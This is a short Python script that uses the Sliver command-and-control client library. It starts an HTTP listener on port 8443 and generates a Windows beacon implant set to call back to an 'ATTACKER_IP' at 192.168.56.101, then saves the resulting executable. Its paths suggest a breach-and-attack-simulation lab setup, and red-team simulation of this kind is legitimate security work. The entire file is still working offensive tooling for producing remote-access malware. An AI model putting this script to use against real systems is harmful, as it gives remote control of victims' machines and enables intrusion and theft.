#!/usr/bin/env python3
import asyncio
from sliver import SliverClientConfig, SliverClient
from sliver.pb.clientpb import client_pb2
import os

CONFIG_PATH = "/home/akila/.sliver-client/configs/bas_operator_localhost.cfg"
ATTACKER_IP = "192.168.56.101"
HTTP_PORT   = 8443
IMPLANT_DIR = "/home/akila/Desktop/bas_platform/sliver_implants"
BEACON_NAME = "bas_beacon"

async def main():
    config = SliverClientConfig.parse_config_file(CONFIG_PATH)
    client = SliverClient(config)
    await client.connect()
    print("[+] Connected to Sliver server")

    # Start HTTP listener
    print(f"[*] Starting HTTP listener on 0.0.0.0:{HTTP_PORT}...")
    try:
        http_job = await client.start_http_listener(host="0.0.0.0", port=HTTP_PORT, domain="", website="")
        print(f"[+] HTTP listener started (Job ID: {http_job.JobID})")
    except Exception as e:
        print(f"[!] Listener: {e}")

    # Build ImplantConfig
    c2 = client_pb2.ImplantC2(Priority=0, URL=f"http://{ATTACKER_IP}:{HTTP_PORT}")
    implant_config = client_pb2.ImplantConfig(
        Name=BEACON_NAME,
        GOOS="windows",
        GOARCH="amd64",
        Format=client_pb2.OutputFormat.Value("EXECUTABLE"),
        IsBeacon=True,
        BeaconInterval=10,
        BeaconJitter=2,
        Evasion=False,
        ObfuscateSymbols=False,
        C2=[c2],
    )

    print(f"\n[*] Generating beacon with Go 1.21...")
    print(f"    C2: http://{ATTACKER_IP}:{HTTP_PORT}")
    print(f"    (Takes 2-3 minutes...)")

    result = await client.generate_implant(implant_config, timeout=360)

    os.makedirs(IMPLANT_DIR, exist_ok=True)
    out_path = f"{IMPLANT_DIR}/{BEACON_NAME}.exe"
    with open(out_path, "wb") as f:
        f.write(result.File.Data)

    size = len(result.File.Data) / 1024 / 1024
    print(f"\n[+] SUCCESS! Beacon saved: {out_path} ({size:.1f} MB)")

asyncio.run(main())
